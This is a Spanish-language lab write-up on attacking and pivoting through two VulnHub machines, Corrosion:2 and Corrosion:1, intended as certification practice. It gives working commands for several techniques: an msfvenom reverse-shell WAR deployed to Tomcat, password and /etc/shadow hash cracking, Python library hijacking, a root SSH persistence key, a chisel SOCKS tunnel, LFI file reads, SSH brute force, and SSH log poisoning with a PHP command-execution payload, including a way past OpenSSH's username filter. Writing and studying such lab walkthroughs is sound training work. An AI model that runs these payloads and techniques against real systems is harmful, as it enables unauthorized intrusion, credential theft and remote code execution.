---
title: "Lab Pivoting Manual Corrosion:1-2 VulnHub"
date: 2026-10-20 21:31:45 +0200
categories: [Labs, Pivoting]
tags: [eJPTv2, eCPPTv2, eWPT, medium, tomcatAbuse, crackingHashes, suid, pythonLibraryHijacking, pivoting, LFI, logPoisoning, pathHijacking]
image:
  path: /assets/img/posts/2026-10-15-shuriken-1//00-vulnhubLogo.svg
  alt: Banner
---

- - -

## Diagrama de Red del laboratorio

![Diagrama de Red del laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/01-diagrama-de-red-del-laboratorio.png){: width="1200" }

Vamos a realizar un laboratorio de **pivoting** pensado para preparar certificaciones como *eCPPTv2* y *eCPTXv2* utilizando máquinas vulnerables de VulnHub. En mi caso lo desplegaré en el hipervisor de tipo 2 *VirtualBox*, explicando cada detalle de la configuración y resolución del laboratorio.

## Despliegue de laboratorio

Lo primero será descargar las máquinas vulnerables de VulnHub [Corrosion:1](https://www.vulnhub.com/entry/corrosion-1,730/) y [Corrosion:2](https://www.vulnhub.com/entry/corrosion-2,745/); una vez hecho, las importaríamos en el hipervisor (sirve tanto VirtualBox como VMware). Una vez importadas debemos configurar la red interna del laboratorio, para ello debemos ir a la pestaña de VirtualBox “Red”:

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/02-despliegue-de-laboratorio.png){: width="120" }

Una vez en esa pestaña, en el apartado de “Redes NAT” crearíamos una nueva red NAT en caso de tener solo una (creo que VirtualBox trae una por defecto creada). Para crear una nueva red NAT únicamente habría que hacer clic en “Crear” en la parte superior izquierda de la pestaña, y en mi caso la configuré de esta forma:

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/03-despliegue-de-laboratorio.png){: width="300" }

Es importante habilitar el *DHCP* para que coja una IP automáticamente y evitemos configurarla a mano en las máquinas del laboratorio. Cabe destacar que, como red externa, voy a estar utilizando la que creo que es la red NAT por defecto que trae VirtualBox, donde desplegaré mi máquina atacante y una interfaz de la primera máquina víctima, como podemos ver en el diagrama de red. Su configuración es la siguiente:

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/04-despliegue-de-laboratorio.png){: width="300" }

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/05-despliegue-de-laboratorio.png)

Con esto listo y las máquinas importadas, queda configurar las interfaces de red de cada una. La primera máquina víctima será *Corrosion:2*, por lo que esta máquina será la que haga de pivote entre nuestra red externa y la red interna que aloja la última máquina objetivo de este laboratorio; como vemos en el diagrama, esta máquina deberá tener dos interfaces de red. Una de estas interfaces estará en la *Red_NAT* y otra en la *Nat_Interna* para tener conectividad con la máquina *Corrosion:1*, esto lo establecemos en la configuración de la propia máquina:

- *Corrosion:2*

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/06-despliegue-de-laboratorio.png){: width="500" }

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/07-despliegue-de-laboratorio.png){: width="500" }

De esta forma, desde nuestra máquina atacante veríamos la interfaz de red que está en la *Red_NAT* y podríamos realizar el ataque.

- *Corrosion:1*

![Despliegue de laboratorio](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/08-despliegue-de-laboratorio.png){: width="500" }

En el caso de *Corrosion:1*, como comentábamos antes, únicamente tiene una interfaz de red en la *Nat_Interna* y solo sería visible desde la máquina *Corrosion:2*.

Una vez configurado podríamos encender las máquinas y empezar el laboratorio.

<br>

## Ataque a Corrosion:2 (10.0.2.19)

- - -
<br>

### Fase de Reconocimiento

- - -

#### Identificación de objetivo en la red

```bash
arp-scan -I enp0s3 --localnet --ignoredups
```

![Identificación de objetivo en la red](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/09-identificacion-de-objetivo-en-la.png){: width="600" }

#### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.0.2.18 -oN allPorts
```

```bash
grep '^[0-9]' allPorts| cut -d '/' -f1 | xargs | sort | tr ' ' ','
```

![Escaneo de puertos](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/10-escaneo-de-puertos.png){: width="500" }

```bash
nmap -p22,80,8080 -sCV 10.0.2.18 -oN targeted
```

![Escaneo de puertos](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/11-escaneo-de-puertos.png){: width="700" }

Tras el escaneo vemos que la máquina víctima cuenta con varios servicios expuestos, entre ellos un servicio SSH en el puerto 22 (no vulnerable a enumeración de usuarios >7.7) y varios servicios HTTP en los puertos 80 y 8080.

### Enumeración

- - -

#### Enumeración de servicio HTTP

##### Web puerto 80

```bash
whatweb http://10.0.2.18
```

![Web puerto 80](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/12-web-puerto-80.png)

```bash
nmap -p80 --script http-enum 10.0.2.18 -oN webScan 
```

![Web puerto 80](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/13-web-puerto-80.png){: width="600" }

En este caso el escaneo de `nmap` no reporta nada.

De primeras, por lo que reporta la herramienta `whatweb`, parece ser una instalación de Apache2 por defecto; si accedemos a través del navegador:

![Web puerto 80](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/14-web-puerto-80.png){: width="1000" }

Efectivamente, además nos indica que estamos ante un Ubuntu; recordemos que, utilizando la versión de Apache y consultando *launchpad*, podríamos averiguar la versión exacta ante la que nos enfrentamos.

En este punto podemos aplicar *fuzzing* para tratar de descubrir rutas o archivos del servicio web.

```bash
gobuster dir -u http://10.0.2.18 -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20

feroxbuster -u http://10.0.2.18 -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

![Web puerto 80](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/15-web-puerto-80.png){: width="900" }

No parece haber nada interesante en esta web, tampoco revisando el código fuente; vamos a echar un vistazo a la web alojada en el puerto 8080.

##### Web puerto 8080

```bash
whatweb http://10.0.2.18:8080
```

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/16-web-puerto-8080.png)

```bash
nmap -p8080 --script http-enum 10.0.2.18 -oN webScan
```

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/17-web-puerto-8080.png){: width="600" }

En este caso el escaneo de `nmap` nos reporta un archivo backup.zip y varios directorios interesantes, vamos a echar un vistazo a través del navegador.

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/18-web-puerto-8080.png){: width="1000" }

Parece una instalación por defecto de *Tomcat*; antes de ver los directorios y archivos descubiertos por `nmap`, no está de más aplicar *fuzzing* con `gobuster` para cerciorarnos de que descubrimos todo lo relevante respecto a la página.

```bash
gobuster dir -u http://10.0.2.18:8080 -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php,zip,txt
```

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/19-web-puerto-8080.png){: width="1000" }

Bien, reporta lo mismo que `nmap`; en este punto vamos a echarle un vistazo a los hallazgos.

- **/readme.txt**

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/20-web-puerto-8080.png){: width="700" }

De este *readme.txt* sacamos el nombre de usuario *randy* y que el administrador del sistema le dejó un archivo en el servidor para el que será necesario utilizar una contraseña que este le dio a *randy*; puede que sea para el *backup.zip*.

- **backup.zip**

```bash
wget http://10.0.2.18:8080/backup.zip
```

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/21-web-puerto-8080.png){: width="500" }

Vemos archivos interesantes como “tomcat-users.xml”, vamos a tratar de echarles un vistazo.

![Web puerto 8080](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/22-web-puerto-8080.png){: width="500" }

Al tratar de descomprimirlo está protegido por contraseña.

##### Crackeo de archivos zip protegidos con contraseña

Lo que podemos hacer en este punto es utilizar la herramienta `zip2john` para extraer el hash de la contraseña y podemos tratar de crackearlo con `john` o `hashcat`.

```bash
zip2john backup.zip

# o directamente

zip2john backup.zip > hash
```

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/23-crackeo-de-archivos-zip-protegidos.png)

Metemos el *hash* en un archivo y ejecutamos el crackeo con `john`:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/24-crackeo-de-archivos-zip-protegidos.png){: width="600" }

De esta forma logramos encontrar la contraseña que protege el comprimido. Una vez descubierta, la utilizamos para descomprimir el archivo.

```bash
7z x backup.zip
```

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/25-crackeo-de-archivos-zip-protegidos.png){: width="500" }

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/26-crackeo-de-archivos-zip-protegidos.png){: width="600" }

Ahora tenemos acceso a los archivos, y el primero que nos debería llamar la atención es el "tomcat-users.xml":

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/27-crackeo-de-archivos-zip-protegidos.png){: width="600" }

Efectivamente, encontramos en él los usuarios *admin* y *manager* con sus respectivas credenciales en texto claro.

- **/manager**

Al tratar de entrar al directorio */manager* también nos encontramos que está protegido con contraseña:

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/28-crackeo-de-archivos-zip-protegidos.png)

Lo primero que debemos pensar es en utilizar las contraseñas descubiertas en los archivos de configuración del *backup.zip*; por ejemplo, vamos a probar a entrar como admin:

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/29-crackeo-de-archivos-zip-protegidos.png){: width="1200" }

Y efectivamente logramos acceso al archivo de *Tomcat /manager/html*. *¿Cuál es la idea en este punto?* La idea en este punto para lograr la intrusión a la máquina aprovechándonos de esta interfaz expuesta en el servicio web es subir un archivo *.war* malicioso que generemos con `msfvenom` y crear una aplicación a partir de él para ganar acceso al sistema víctima.

![Crackeo de archivos zip protegidos con contraseña](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/30-crackeo-de-archivos-zip-protegidos.png){: width="700" }

> **Un archivo **.WAR** (_Web Application Archive_) es un paquete comprimido en formato ZIP que agrupa todos los componentes de una aplicación web Java —como código compilado, librerías, archivos de configuración y recursos estáticos— para facilitar su transporte y despliegue.**
{: .prompt-info }

### Explotación

- - -

#### Tomcat abuse fileUpload .war

Por lo tanto generamos el archivo .war malicioso con `msfvenom` que nos mande una reverse shell a nuestro equipo y así podamos realizar la intrusión:

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.0.2.13 lport=443 -f war -o reverse.war 
```

![Tomcat abuse fileUpload .war](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/31-tomcat-abuse-fileupload-war.png){: width="700" }

Una vez generado el archivo malicioso podríamos ponernos ya en escucha en nuestra máquina atacante para recibir la reverse shell.

```bash
nc -nlvp 443
```

Tras esto subimos el archivo malicioso al Tomcat y debería aparecernos como una nueva aplicación:

![Tomcat abuse fileUpload .war](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/32-tomcat-abuse-fileupload-war.png){: width="700" }

![Tomcat abuse fileUpload .war](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/33-tomcat-abuse-fileupload-war.png){: width="200" }

En este punto pincharíamos en “reverse” para que el servidor la interprete y ganar acceso al sistema.

![Tomcat abuse fileUpload .war](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/34-tomcat-abuse-fileupload-war.png){: width="300" }

Antes de empezar con la enumeración local para escalar privilegios vamos a aplicar un tratamiento de la TTY.

#### Tratamiento de la TTY 

```bash
script /dev/null -c bash
# ctrl + z 
stty raw -echo;fg 
reset xterm 
export TERM=xterm SHELL=bash
stty rows 53 columns 206
```

### Escalada de privilegios

- - -

#### Enumeración local

Una vez hecho el tratamiento de la TTY podemos empezar con la enumeración local de la máquina víctima. Lo primero que nos llama la atención es que cuenta con dos interfaces de red, por lo que podemos intuir que hay una subred y más posibles máquinas víctima.

Dejando esto de lado por el momento, empezamos la enumeración.

```bash
grep 'sh$' /etc/passwd
```

![Enumeración local](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/35-enumeracion-local.png){: width="500" }

Enumerando el sistema descubrimos que tenemos acceso al directorio home del usuario “randy” y en él encontramos la primera flag de usuario.

![Enumeración local](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/36-enumeracion-local.png){: width="400" }

También encontramos esta nota:

![Enumeración local](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/37-enumeracion-local.png){: width="700" }

Le indica al usuario randy que se cambiaron los permisos de su directorio home y no puede borrar ni crear archivos. En este punto, tras enumerar un poco el sistema, no vemos nada destacable de lo que tirar para escalar privilegios, pero, si recordamos, contamos con varias credenciales que recolectamos a lo largo del test de intrusión. Podemos ver si se está aplicando alguna reutilización de credenciales para algún usuario del sistema.

#### User Pivoting

Y efectivamente, para el usuario jaye se está aplicando una reutilización de credenciales.

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/38-user-pivoting.png){: width="300" }

En el directorio home de este usuario hay un directorio “Files” que nos llama la atención y en su interior encontramos un archivo interesante.

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/39-user-pivoting.png){: width="500" }

El archivo “look” cuenta con permisos *suid* y *sgid*; por lo tanto, como el propietario y grupo es root, al ejecutarlo lo haríamos con los permisos del mismo. Por las instrucciones de uso parece que busca cadenas que le pasemos dentro de archivos, podemos probar:

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/40-user-pivoting.png){: width="400" }

Parece que estamos en lo cierto. Aprovechando este comando y sus permisos podríamos tratar de ver el archivo */etc/shadow* para intentar crackear algún hash, como el de root o el del usuario randy. Si queremos ver el método de encriptación utilizado podemos verlo de la siguiente manera:

```bash
cat /etc/login.defs | grep ENCRYPT
```

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/41-user-pivoting.png){: width="500" }

Se está empleando SHA512.

```bash
./look randy /etc/shadow
```

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/42-user-pivoting.png)

Bien, una vez tenemos el hash podemos tratar de crackearlo. Para ello lo copiamos y lo metemos en un archivo llamado hash, en mi caso, en nuestra máquina atacante, y con john o hashcat lanzamos el ataque.

```bash
hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt
```

> **Crackeo de hash SHA512 con GPU (AMD RX 9060 XT)**
>
> Para este hash en concreto lancé Hashcat desde mi **máquina host** (Debian 13) en vez de la VM, para poder aprovechar la GPU dedicada en vez de depender de la CPU — las VMs no suelen tener passthrough de GPU configurado, así que Hashcat caía a cómputo por CPU (mucho más lento).
>
> **Comando usado:**
> ```bash
> hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt -O
> ```
> - `-m 1800`: modo SHA512(Unix) / sha512crypt
> - `-a 0`: ataque por diccionario
> - `-O`: kernels optimizados (más rápido, limita longitud máxima de password soportada)
>
> **Nota técnica:** tuve que configurar ROCm (stack oficial de cómputo de AMD) en vez de depender del driver Mesa/Clover por defecto, porque Hashcat bloquea Clover al considerarlo inestable (riesgo de falsos negativos silenciosos en la compilación de kernels OpenCL). Con ROCm, Hashcat detecta la GPU vía el backend `AMD-APP` y usa los 16GB de VRAM completos en vez del límite de 4GB que imponía Clover.
{: .prompt-info }

Tras un buen rato, a pesar de aprovecharnos de la gráfica para esta tarea, obtenemos la contraseña del usuario randy:

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/43-user-pivoting.png)

Solo queda validar si es correcto.

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/44-user-pivoting.png){: width="400" }

Y efectivamente logramos aplicar otro *user pivoting* para ganar acceso como el usuario randy. En este punto vamos a enumerar de nuevo el sistema con este usuario.

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/45-user-pivoting.png){: width="700" }

Vemos que el usuario randy está en el grupo *sudo* y que puede ejecutar con privilegios de root el script de Python “randombase64.py”, vamos a echarle un vistazo al script:

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/46-user-pivoting.png){: width="400" }

Se está importando la librería *base64*… Viendo esto y con este contexto de que se ejecuta con privilegios de root este script, como atacantes podríamos aprovecharnos de un **Python Library Hijacking** para escalar privilegios.

#### Python Library Hijacking

Esta técnica se basa en que, por defecto, al importar una librería, Python siempre busca en primer lugar en el directorio actual de trabajo. Aprovechándonos de esto, podemos crear un archivo base64.py con nuestras instrucciones maliciosas; de este modo, al ejecutar el script, se ejecutarán con permisos de root.

Cabe destacar que el home de randy no permite crear archivos ni al propietario dentro de él, pero, como estamos como el usuario randy, podemos modificar los permisos.

```bash
chmod +w $(pwd)
```

Una vez hecho creamos el archivo con las instrucciones.

![Python Library Hijacking](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/47-python-library-hijacking.png){: width="300" }

Y ejecutamos el script “randombase64.py”.

```bash
sudo /usr/bin/python3.8 /home/randy/randombase64.py
```

![Python Library Hijacking](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/48-python-library-hijacking.png){: width="500" }

De esta forma logramos setearle permisos *suid* a la bash para escalar privilegios en la máquina víctima.

![Python Library Hijacking](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/49-python-library-hijacking.png){: width="400" }

Con esto hecho habríamos comprometido la máquina completamente. Queda ganar persistencia para enumerar y atacar la subred descubierta anteriormente.

### Persistencia

Para garantizar la persistencia en la máquina vamos a copiarnos nuestra clave _SSH_ pública en el archivo _/root/.ssh/authorized_keys_; una vez hecho, podremos conectarnos como root a la máquina comprometida en cualquier momento.

<br>

## Ataque a Corrosion:1 (192.168.0.7)

- - -

<br>

### HostDiscovery

- - -

Una vez ganada persistencia en la máquina podemos pasar a descubrir hosts en el segmento de red descubierto, para ello podemos usar un *Ping Sweep One Liner*:

```bash
for i in {1..254} ;do (ping -c 1 192.168.100.$i | grep "bytes from" &) ;done
```

![HostDiscovery](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/50-hostdiscovery.png){: width="700" }

Descubrimos la *192.168.100.7*, vamos a realizar un escaneo de puertos de forma manual para ver cuáles están abiertos, para ello creamos un script en bash tal que:

```bash
#!/bin/bash

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/192.168.100.7/$port" &> /dev/null && echo "[+] Host 192.168.100.7 - PORT $port - OPEN" &
done; wait
```

![HostDiscovery](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/51-hostdiscovery.png){: width="400" }

Vemos que tiene el puerto 80 y el 22 abiertos, correspondientes en principio a los servicios *HTTP* y *SSH*. Para trabajar más cómodamente vamos a utilizar chisel para entablar un túnel de tipo **socks5** y ganar acceso a la subred desde nuestra máquina atacante utilizando la máquina víctima recién comprometida como pivote.

### Pivoting manual con **chisel**

- - -

Para esto lo primero es descargarnos el binario de su [repositorio](https://github.com/jpillora/chisel), y prepararlo para transferirlo a la máquina pivote. Podemos jugar con `upx` para optimizar el binario y que ocupe lo menos posible:

![Pivoting manual con **chisel**](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/52-pivoting-manual-con-chisel.png){: width="500" }

Una vez hecho, aprovechándonos de la persistencia establecida, podemos utilizar `scp` para transferir el binario a la máquina víctima.

```bash
scp chisel root@10.0.2.19:/root
```

![Pivoting manual con **chisel**](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/53-pivoting-manual-con-chisel.png){: width="400" }

#### Entablando túnel **socks5**

Una vez hecho, podríamos levantar el servidor en nuestra máquina atacante y conectarnos como cliente desde el pivote de forma que:

```bash
# desde nuestra máquina atacante levantamos el servidor con chisel
./chisel server --reverse -p 1234
```

```bash
# desde la máquina pivote nos conectamos a él obteniendo acceso a toda la subred 
chisel client --reverse 10.0.2.13:1234 R:socks
```

![Entablando túnel **socks5**](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/54-entablando-tunel-socks5.png){: width="600" }

Por ahí vemos que se entabla el túnel, por defecto en el puerto 1080, ya que es el que aparece por defecto en el archivo */etc/proxychains.conf*.

![Entablando túnel **socks5**](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/55-entablando-tunel-socks5.png){: width="300" }

Una vez hecho esto ya podríamos utilizar `proxychains` para llegar a la subred descubierta.

```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} --open -T5 -v -n 192.168.100.7 2>/dev/null 2>&1 | grep "tcp open"
```

De esta forma estaríamos empleando hilos con `xargs` para agilizar el escaneo y encontrar puertos abiertos con `nmap` de la forma más ágil posible, ya que el uso de túneles ralentiza bastante la comunicación.

![Entablando túnel **socks5**](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/56-entablando-tunel-socks5.png){: width="1000" }

### Enumeración

- - -

#### Enumeración de servicio HTTP 

```bash
proxychains whatweb http://192.168.100.7 2>/dev/null
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/57-enumeracion-de-servicio-http.png)

Para acceder desde el navegador a la web podemos hacer uso de `foxyproxy` para configurar el proxy de tipo **socks5** y enrutar por ahí el tráfico.

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/58-enumeracion-de-servicio-http.png){: width="700" }

Una vez establecido lo seleccionamos y podemos acceder a la web a través de él:

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/59-enumeracion-de-servicio-http.png){: width="800" }

Vemos una nueva instalación por defecto de Apache2. En este punto vamos a aplicar fuzzing a ver qué descubrimos.

```bash
proxychains feroxbuster -u http://192.168.100.7 -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 2>/dev/null
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/60-enumeracion-de-servicio-http.png){: width="1200" }

Encontramos varios archivos y rutas interesantes, por ejemplo: */task/tasks_todo.txt*, */blog-post*, etc. Vamos a echar un vistazo.

- */task/tasks_todo.txt*

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/61-enumeracion-de-servicio-http.png){: width="400" }

- */blog-post*

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/62-enumeracion-de-servicio-http.png){: width="600" }

- */blog-post/randylogs.php*

De primeras, al acceder vía navegador no encontramos nada, ya que la web interpreta el código php.

##### Búsqueda de parámetros **LFI** a través de fuzzing

Lo que podríamos intentar y validar como atacantes es si acepta parámetros y es vulnerable a **LFI**; esto podemos hacerlo aplicando *fuzzing* de la siguiente manera:

```bash
gobuster fuzz -u "http://192.168.100.7/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1080 | grep -v "Length=0|Length=305"
```

![Búsqueda de parámetros **LFI** a través de fuzzing](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/63-busqueda-de-parametros-lfi-a.png)

Vemos que el parámetro “file” existe y devuelve algo al pasarle el archivo */etc/passwd*, vamos a echar un vistazo en el navegador.

![Búsqueda de parámetros **LFI** a través de fuzzing](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/64-busqueda-de-parametros-lfi-a.png){: width="500" }

Efectivamente está teniendo lugar un **LFI** y conseguimos ver el contenido del archivo */etc/passwd*. Descubrimos el usuario randy, que también existe en esta máquina; podríamos ejecutar un ataque de fuerza bruta contra este usuario al servicio *SSH* en paralelo mientras seguimos enumerando y trazando el vector de ataque:

```bash
proxychains hydra -l randy -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.7 -t 20 2>/dev/null
```

### Explotación

- - -

#### Explotación de **LFI** (archivos interesantes a revisar)

Para ver más claro desde consola los usuarios con una shell asignada podemos ejecutar el siguiente comando.

```bash
proxychains curl -s "http://192.168.100.7/blog-post/archives/randylogs.php?file=/etc/passwd" 2>/dev/null | grep "sh$"
```

![Explotación de **LFI** (archivos interesantes a revisar)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/65-explotacion-de-lfi-archivos-interesantes.png){: width="900" }

Vemos el usuario randy, www-data y root, nada destacable. Vamos a tratar de sacar algo de información enumerando algunos archivos de la máquina, como el */proc/net/fib_trie*, que nos permite ver información relativa a la dirección de red de la máquina víctima:

```bash
proxychains curl -s "http://192.168.100.7/blog-post/archives/randylogs.php?file=/proc/net/fib_trie" 2>/dev/null
```

![Explotación de **LFI** (archivos interesantes a revisar)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/66-explotacion-de-lfi-archivos-interesantes.png){: width="700" } 

Para sacar información relativa a los **puertos internos abiertos en la máquina** podemos enumerar el archivo */proc/net/tcp*:

```bash
proxychains curl -s "http://192.168.100.7/blog-post/archives/randylogs.php?file=/proc/net/tcp" 2>/dev/null
```

![Explotación de **LFI** (archivos interesantes a revisar)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/67-explotacion-de-lfi-archivos-interesantes.png){: width="1000" }

Ahí vemos que los reporta en hexadecimal y cómo podemos hacer una conversión rápida a decimal. Para sacar información relativa a los **procesos y tareas que se están ejecutando en el sistema** podemos enumerar el archivo */proc/sched_debug*:

```bash
proxychains curl -s "http://192.168.100.7/blog-post/archives/randylogs.php?file=/proc/sched_debug" 2>/dev/null
```

![Explotación de **LFI** (archivos interesantes a revisar)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/68-explotacion-de-lfi-archivos-interesantes.png){: width="800" }

En este punto, *¿cómo podríamos llegar a ejecutar comandos aprovechándonos de este **LFI**?* Pues validando si es vulnerable a **Log Poisoning**, aprovechando además que cuenta tanto con el servicio *Apache2* como *SSH*.

#### Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)

Lo primero es validar si somos capaces de acceder a los registros de logs de estos servicios, empezando con **Apache2** en */var/log/apache2/access.log*; en caso de ser capaces, trataremos de envenenarlo con nuestras instrucciones maliciosas buscando un **RCE**.

```bash
proxychains curl -s "http://192.168.100.7/blog-post/archives/randylogs.php?file=/var/log/apache2/access.log" 2>/dev/null
```

![Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/69-explotacion-de-log-poisoning-ssh.png){: width="1000" }

No tiene capacidad de lectura, así que vamos a tirar por los logs de **SSH** en su archivo */var/log/auth.log*.

```bash
proxychains curl -s "http://192.168.100.7/blog-post/archives/randylogs.php?file=/var/log/auth.log" 2>/dev/null
```

![Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/70-explotacion-de-log-poisoning-ssh.png){: width="900" }

Y bingo, en este caso sí que tenemos capacidad de lectura en los logs, por lo que podemos tratar de envenenarlos.

> **En el caso de los logs de *SSH*, el atacante puede inyectar código PHP en el campo de usuario durante el proceso de autenticación. Esto permite que el código se registre en el log 'auth.log' de *SSH* y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.**
{: .prompt-info }

```bash
proxychains ssh '<?php system($_GET["cmd"]); ?>'@192.168.100.7 2>/dev/null   
```

![Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/71-explotacion-de-log-poisoning-ssh.png){: width="500" }

Vemos que nos da un error de caracteres inválidos, y es que desde hace unas versiones, OpenSSH valida que el username no contenga ciertos caracteres especiales (<, ?, espacios, etc.) para evitar inyección de argumentos… *¿Cómo podríamos bypassear esta restricción?* Investigando por internet y viendo writeups de esta máquina no encontré mucho, ya que eran de hace varios años, cuando esto no estaba parcheado en el código fuente de OpenSSH, y las pruebas que encontré necesitaban tener expuesto el servicio sftp. Al final se me dio por probar con otra herramienta que entabla conexiones SSH, `hydra`; probé a pasarle el código en el campo user a través de esta herramienta y ¡bingo!

Por lo que sabiendo esto lo haríamos de esta forma:

```bash
proxychains hydra -l '<?php system($_GET["cmd"]); ?>' -p test ssh://192.168.100.7
```

